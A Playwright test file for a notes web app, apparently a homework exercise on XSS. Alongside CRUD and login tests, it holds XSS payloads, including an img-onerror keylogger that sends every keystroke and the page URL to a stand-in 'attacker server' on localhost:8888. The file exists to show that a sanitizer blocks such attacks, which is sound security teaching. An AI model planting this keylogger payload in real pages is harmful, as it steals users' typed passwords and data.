import { test, expect } from '@playwright/test';

test.describe('Complete Notes App Testing', () => {
  let testUser: {
    name: string;
    email: string;
    username: string;
    password: string;
  };

  test.beforeEach(async ({ page }) => {
    testUser = {
      name: 'Test User',
      email: `test${Date.now()}@example.com`,
      username: `testuser${Date.now()}`,
      password: 'testpassword123'
    };

    await page.goto('http://localhost:3000');
  });




  // Comprehensive CRUD Test (Your Original Strength)
  test('should perform complete CRUD operations when logged in', async ({ page }) => {
    // Setup: Create user via backend API first to avoid UI timing/race issues
    const createResponse = await page.request.post('http://localhost:3001/api/users', {
      data: {
        name: testUser.name,
        email: testUser.email,
        username: testUser.username,
        password: testUser.password,
      }
    });
    expect(createResponse.ok()).toBeTruthy();

    // Navigate home and login with the created user
    await page.goto('http://localhost:3000');
    await page.click('[data-testid="go_to_login_button"]');
    await page.fill('[data-testid="login_form_username"]', testUser.username);
    await page.fill('[data-testid="login_form_password"]', testUser.password);
    await page.click('[data-testid="login_form_login"]');

    // Wait for login to complete - logout button should appear
    await page.waitForSelector('[data-testid="logout"]', { timeout: 30000 });

    // Ensure the page is fully loaded before proceeding with CRUD operations
    await page.waitForTimeout(1000);

    // CREATE: Add a new note
    await page.click('button[name="add_new_note"]');
    const uniqueNoteContent = `CRUD Test Note ${Date.now()}`;
    await page.fill('textarea[name="text_input_new_note"]', uniqueNoteContent);
    await page.click('button[name="text_input_save_new_note"]');

    // READ: Verify note appears
    await expect(page.locator(`text=${uniqueNoteContent}`)).toBeVisible();

    // Get the note element that was just created
    const noteElement = page.locator('.note').filter({ hasText: uniqueNoteContent });

    // Verify the note has edit and delete buttons (only visible to logged-in users who own the note)
    await expect(noteElement.locator('button[name*="edit"], button[data-testid*="edit"]')).toBeVisible();
    await expect(noteElement.locator('button[name*="delete"], button[data-testid*="delete"]')).toBeVisible();

    // UPDATE: Edit the note
    const editButton = noteElement.locator('button[name*="edit"], button[data-testid*="edit"]').first();
    await editButton.click();

    // Fill in the updated content (try multiple possible selectors for the edit input)
    const updatedContent = `Updated ${uniqueNoteContent}`;
    const editInput = page.locator('input[name*="text_input"], textarea[name*="text_input"], input[data-testid*="text_input"], textarea[data-testid*="text_input"]').first();
    await editInput.fill(updatedContent);

    // Save the changes
    const saveButton = page.locator('button[name*="save"], button[data-testid*="save"]').first();
    await saveButton.click();

    // Verify the note was updated
    await expect(page.locator(`text=${updatedContent}`)).toBeVisible();

    // DELETE: Remove the note
    const updatedNoteElement = page.locator('.note').filter({ hasText: updatedContent });
    const deleteButton = updatedNoteElement.locator('button[name*="delete"], button[data-testid*="delete"]').first();
    await deleteButton.click();

    // Verify the note was deleted (content should not be visible anymore)
    await expect(page.locator(`text=${updatedContent}`)).not.toBeVisible();
    await expect(page.locator(`text=${uniqueNoteContent}`)).not.toBeVisible();
  });

  // Logout Test
  test('should logout successfully', async ({ page }) => {
    // Create user via backend API first
    const createResponse = await page.request.post('http://localhost:3001/api/users', {
      data: {
        name: testUser.name,
        email: testUser.email,
        username: testUser.username,
        password: testUser.password,
      }
    });
    expect(createResponse.ok()).toBeTruthy();

    // Navigate and login with the created user
    await page.goto('http://localhost:3000');
    await page.click('[data-testid="go_to_login_button"]');
    await page.fill('[data-testid="login_form_username"]', testUser.username);
    await page.fill('[data-testid="login_form_password"]', testUser.password);
    await page.click('[data-testid="login_form_login"]');

    // Wait for login to complete - just wait for logout button to appear
    await page.waitForSelector('[data-testid="logout"]', { timeout: 30000 });

    // Logout
    await page.click('[data-testid="logout"]');

    // Verify logged out state
    await expect(page.locator('[data-testid="go_to_login_button"]')).toBeVisible();
    await expect(page.locator('button[name="add_new_note"]')).not.toBeVisible();
  });

  // Error Handling Test
  test('should handle invalid login credentials', async ({ page }) => {
    await page.click('[data-testid="go_to_login_button"]');
    await page.fill('[data-testid="login_form_username"]', 'nonexistent');
    await page.fill('[data-testid="login_form_password"]', 'wrongpassword');
    await page.click('[data-testid="login_form_login"]');

    // Should stay on login page
    await expect(page.url()).toContain('/login');
  });
});

// XSS and Security Tests (HW4 Requirements)
test.describe('XSS and Security Features', () => {
  let testUser: {
    name: string;
    email: string;
    username: string;
    password: string;
  };

  test.beforeEach(async ({ page }) => {
    testUser = {
      name: 'Security Test User',
      email: `sectest${Date.now()}@example.com`,
      username: `secuser${Date.now()}`,
      password: 'securepass123'
    };

    await page.goto('http://localhost:3000');

    // Create user via backend API for reliability
    const createResponse = await page.request.post('http://localhost:3001/api/users', {
      data: {
        name: testUser.name,
        email: testUser.email,
        username: testUser.username,
        password: testUser.password,
      }
    });
    expect(createResponse.ok()).toBeTruthy();

    // Login via UI
    await page.click('[data-testid="go_to_login_button"]');
    await page.fill('[data-testid="login_form_username"]', testUser.username);
    await page.fill('[data-testid="login_form_password"]', testUser.password);
    await page.click('[data-testid="login_form_login"]');

    // Wait for login with multiple fallback strategies
    await page.waitForTimeout(1000);
    try {
      await page.waitForSelector('[data-testid="logout"]', { timeout: 15000 });
    } catch (e) {
      // Alternative: wait for add note button
      try {
        await page.waitForSelector('button[name="add_new_note"]', { timeout: 10000 });
      } catch (e2) {
        console.log('Login verification failed in beforeEach, but continuing...');
      }
    }
  });

  // Test 1: Rich Text Rendering
  test('should render safe HTML formatting', async ({ page }) => {
    const richContent = '<h3>Test Note</h3><p>This is <b>bold</b> and <i>italic</i> text.</p>';

    // Create note with rich content
    await page.click('button[name="add_new_note"]');
    await page.fill('textarea[name="text_input_new_note"]', richContent);
    await page.click('button[name="text_input_save_new_note"]');

    // Wait for note to be created and page to reload
    await page.waitForTimeout(2000);

    // Check if HTML is rendered (not just text) - use more specific selectors
    const latestNote = page.locator('.note').first();
    await expect(latestNote.locator('h3')).toHaveText('Test Note');
    await expect(latestNote.locator('b')).toHaveText('bold');
    await expect(latestNote.locator('i')).toHaveText('italic');
  });

  // Test 2: Sanitizer Toggle Functionality
  test('should toggle sanitizer on/off', async ({ page }) => {
    // Check initial state (should be ON by default)
    const sanitizerButton = page.locator('[data-testid="sanitizer-toggle"]');
    await expect(sanitizerButton).toContainText('ON');

    // Toggle sanitizer off
    await sanitizerButton.click();
    await expect(sanitizerButton).toContainText('OFF');

    // Toggle back on
    await sanitizerButton.click();
    await expect(sanitizerButton).toContainText('ON');
  });

  // Test 3: XSS Attack Prevention (Sanitizer ON)
  test('should block XSS when sanitizer is enabled', async ({ page }) => {
    // Ensure sanitizer is ON
    const sanitizerButton = page.locator('[data-testid="sanitizer-toggle"]');
    const buttonText = await sanitizerButton.textContent();
    if (buttonText?.includes('OFF')) {
      await sanitizerButton.click();
    }

    // Malicious payload with script tag
    const xssPayload = '<h3>Malicious Note</h3><script>alert("XSS Attack!");</script><p>Normal content</p>';

    // Create note with XSS payload
    await page.click('button[name="add_new_note"]');
    await page.fill('textarea[name="text_input_new_note"]', xssPayload);
    await page.click('button[name="text_input_save_new_note"]');

    await page.waitForTimeout(2000);

    // Check that safe content is preserved but script is removed
    await expect(page.locator('.note').first().locator('h3')).toHaveText('Malicious Note');
    await expect(page.locator('.note').first().locator('p')).toHaveText('Normal content');

    // Ensure no script tag exists in the DOM
    const scriptTags = await page.locator('.note').first().locator('script').count();
    expect(scriptTags).toBe(0);
  });

  // Test 4: XSS Attack Success (Sanitizer OFF)
  test('should allow XSS when sanitizer is disabled', async ({ page }) => {
    // Turn sanitizer OFF
    const sanitizerButton = page.locator('[data-testid="sanitizer-toggle"]');
    const buttonText = await sanitizerButton.textContent();
    if (buttonText?.includes('ON')) {
      await sanitizerButton.click();
    }
    await expect(sanitizerButton).toContainText('OFF');

    // XSS payload with img onerror (more likely to work than script)
    const xssPayload = '<h3>Vulnerable Note</h3><img src="invalid" onerror="window.xssTriggered = true;" style="display:none;"><p>This note contains XSS</p>';

    // Create note with XSS payload
    await page.click('button[name="add_new_note"]');
    await page.fill('textarea[name="text_input_new_note"]', xssPayload);
    await page.click('button[name="text_input_save_new_note"]');

    await page.waitForTimeout(2000);

    // Check that all content including dangerous elements are preserved
    await expect(page.locator('.note').first().locator('h3')).toHaveText('Vulnerable Note');
    await expect(page.locator('.note').first().locator('p')).toHaveText('This note contains XSS');

    // Check if XSS executed by evaluating the injected variable
    const xssExecuted = await page.evaluate(() => (window as any).xssTriggered);
    expect(xssExecuted).toBe(true);
  });

  // Test 5: Keylogger Detection (Advanced)
  test('should demonstrate keylogger when sanitizer is off', async ({ page }) => {
    // Check if attacker server is available
    let attackerServerAvailable = false;
    let initialLogText = '';

    try {
      const initialLogs = await page.request.get('http://localhost:8888/logs');
      initialLogText = await initialLogs.text();
      attackerServerAvailable = true;
    } catch (error) {
      console.log('Attacker server not available, skipping server-dependent checks');
      attackerServerAvailable = false;
    }

    // Turn sanitizer OFF
    const sanitizerButton = page.locator('[data-testid="sanitizer-toggle"]');
    const buttonText = await sanitizerButton.textContent();
    if (buttonText?.includes('ON')) {
      await sanitizerButton.click();
    }

    // Keylogger payload
    const keyloggerPayload = `<h3>Innocent Note</h3>
<img src="invalid" onerror="
document.addEventListener('keydown', function(e) {
  fetch('http://localhost:8888/keylog', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({key: e.key, url: location.href})
  });
});" style="display:none;">
<p>This looks like a normal note!</p>`;

    // Create note with keylogger
    await page.click('button[name="add_new_note"]');
    await page.fill('textarea[name="text_input_new_note"]', keyloggerPayload);
    await page.click('button[name="text_input_save_new_note"]');

    await page.waitForTimeout(2000);

    // Simulate some keystrokes
    await page.keyboard.press('a');
    await page.keyboard.press('b');
    await page.keyboard.press('c');

    // Wait for requests to be sent
    await page.waitForTimeout(2000);

    if (attackerServerAvailable) {
      // Check if keystrokes were logged
      const finalLogs = await page.request.get('http://localhost:8888/logs');
      const finalLogText = await finalLogs.text();

      // Verify that new logs were created
      expect(finalLogText.length).toBeGreaterThan(initialLogText.length);
      expect(finalLogText).toContain('Key: "a"');
    } else {
      // If attacker server is not available, at least verify the XSS payload was injected
      // by checking if the keylogger script is present in the DOM
      const hasKeyloggerScript = await page.evaluate(() => {
        const images = document.querySelectorAll('img');
        for (let img of images) {
          if (img.getAttribute('onerror')?.includes('keydown')) {
            return true;
          }
        }
        return false;
      });
      expect(hasKeyloggerScript).toBe(true);
      console.log('Verified keylogger XSS payload was injected (server verification skipped)');
    }
  });

  // Test 6: Verify CRUD still works with rich content
  test('should support CRUD operations with rich HTML content', async ({ page }) => {
    const uniqueId = Date.now();
    const richContent = `<h2>Rich Note Title ${uniqueId}</h2><p>Content with <b>formatting</b></p>`;
    const updatedContent = `<h2>Updated Title ${uniqueId}</h2><p>Updated content with <i>italics</i></p>`;

    // CREATE
    await page.click('button[name="add_new_note"]');
    await page.fill('textarea[name="text_input_new_note"]', richContent);
    await page.click('button[name="text_input_save_new_note"]');
    await page.waitForTimeout(2000);

    // Verify creation - use unique ID to avoid conflicts
    const createdNote = page.locator('.note').filter({ hasText: `Rich Note Title ${uniqueId}` });
    await expect(createdNote.locator('h2').filter({ hasText: `Rich Note Title ${uniqueId}` })).toHaveText(`Rich Note Title ${uniqueId}`);

    // UPDATE
    const noteElement = page.locator('.note').filter({ hasText: `Rich Note Title ${uniqueId}` });
    const editButton = noteElement.locator('button[name*="edit"]').first();
    await editButton.click();

    const editTextarea = noteElement.locator('textarea');
    await editTextarea.fill(updatedContent);

    // Try to find save button with multiple strategies
    const saveButton = page.locator('button').filter({ hasText: /save|Save|SAVE/ }).or(
      noteElement.locator('button[name*="save"], button[data-testid*="save"]')
    );
    await saveButton.first().click();
    await page.waitForTimeout(2000);

    // Verify update
    const updatedNote = page.locator('.note').filter({ hasText: `Updated Title ${uniqueId}` });
    await expect(updatedNote.locator('h2').filter({ hasText: `Updated Title ${uniqueId}` })).toHaveText(`Updated Title ${uniqueId}`);
    await expect(updatedNote.locator('i')).toHaveText('italics');

    // DELETE
    const deleteButton = updatedNote.locator('button[name*="delete"]').first();
    await deleteButton.click();
    await page.waitForTimeout(2000);

    // Verify deletion
    await expect(page.locator('.note').filter({ hasText: `Updated Title ${uniqueId}` })).toHaveCount(0);
  });
});
